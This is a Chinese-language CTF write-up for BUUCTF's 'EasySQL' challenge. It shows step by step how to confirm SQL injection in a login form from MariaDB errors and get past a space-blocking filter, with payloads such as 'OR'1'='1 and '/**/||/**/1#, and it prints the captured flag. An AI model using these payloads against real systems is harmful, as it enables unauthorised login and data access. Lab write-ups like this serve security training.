# EasySQL

FROM:BUUCTF

打开靶机，看到一个页面需要用户登录

#### 尝试 `'`:

首先可以想到SQL注入漏洞，输入单引号尝试**是否有注入点**：

```
username=admin&password='
```

发现页面输出：

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

首先，可以得知，我们的**注入是有效的**，这道题大概率就是用SQL绕过的题目

通过这个报错，可以看到它指向的是 

```
'''''  五个单引号
```

反推SQL语句：

```sql
SELECT * FROM users WHERE password = '<我的输入>'
```

我输入了一个单引号，但是报错五个单引号，那么多出来几个单引号？

理应是

```
''' 这就是我的输入加上原本的两个引号
说明多出来了两个引号
```

#### 尝试 `''`:

**但是**，当我们输入双引号的时候:

直接返回：

```
NO,Wrong username password！！！
```

所以，就说明，当我们输入双引号的时候，应用程序是当成闭合的字符串了。

所以说，密码所在的位置前后应该有两个单引号。



#### 尝试 `' OR 1=1 --`:

会直接返回400 bad request

返回400，就代表没有进入数据库，在web层就被拒绝了：

> 这说明存在输入过滤/WAF/正则拦截

那么我们就有这几种可能：

- OR被拦截
- 空格被拦截
- 没编码
- 注释符号不对



#### 尝试 `'/**/OR/**/1=1/**/--`:

发现成功进入数据库，但是报错：

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

这次是三个单引号了：

那么得到的结论就是空格是被禁止的。

还是来假设原始语句：

```
SELECT * FROM users WHERE password = '<input>'
```

这是我的输入：

```
'/**/OR/**/1=1/**/--
```

拼接之后等价于：

```
password = ''/**/OR/**/1=1/**/--'
```

说明：

- 成功绕过了WEB层
- SQL被执行
- `/**/`但是不能替代`--`后的空格，导致字符串没有被注释，出现多余的`'`



#### 尝试`'OR'1'='1`：

既然空格和注释都是被禁止的，那么我们就可以不用它们。

在MySQL中也是合法的。

就可以得到flag：

```
flag{a247c502-41f3-45a6-b315-07c360aa6c2e}
```



这是另一种payload：

```
'/**/||/**/1#
```

`||` 就相当于是OR



